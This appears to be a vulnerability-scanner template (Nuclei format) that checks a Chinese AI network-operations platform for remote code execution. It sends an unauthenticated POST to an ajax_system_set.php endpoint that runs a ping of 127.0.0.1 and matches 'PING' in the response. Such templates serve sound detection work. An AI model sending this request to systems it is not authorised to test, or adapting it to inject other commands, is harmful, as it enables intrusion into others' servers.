id: tg-net-rce
info:
  author: Str1am
  name: "\u4E07\u7F51\u535A\u901A\u5168\u606FAI\u7F51\u7EDC\u8FD0\u7EF4\u5E73\u53F0\
    rce"
  severity: high
  tags: rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - PING
  matchers-condition: and
  raw:
  - 'POST /nmss/toolMenu/Ajax/ajax_system_set.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    cmd=ping_hostname&hostname=127.0.0.1&packet_size=56&count=4&haveEn=1

    '
